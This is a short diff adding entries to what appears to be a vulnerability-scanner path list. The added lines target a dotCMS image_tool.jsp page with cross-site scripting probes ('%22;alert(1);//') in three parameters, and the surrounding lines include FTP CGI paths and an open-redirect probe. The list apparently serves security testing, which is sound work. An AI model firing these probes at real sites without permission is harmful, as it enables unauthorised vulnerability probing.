@@ -1,3 +1,7 @@
+/html/js/dotcms/dijit/image/image_tool.jsp
+/html/js/dotcms/dijit/image/image_tool.jsp?inode=aaaaaaa%22;alert(1);//
+/html/js/dotcms/dijit/image/image_tool.jsp?inode=&identifier=aaaaaaa%22;alert(1);//&fieldName=
+/html/js/dotcms/dijit/image/image_tool.jsp?inode=&identifier=&fieldName=aaaaaaa%22;alert(1);//
 /set_ftp.cgi?next_url=ftp.htm
 /ftptest.cgi?next_url=test_ftp.htm
 /aam/gridSummary.action?redirect:https://www.google.com
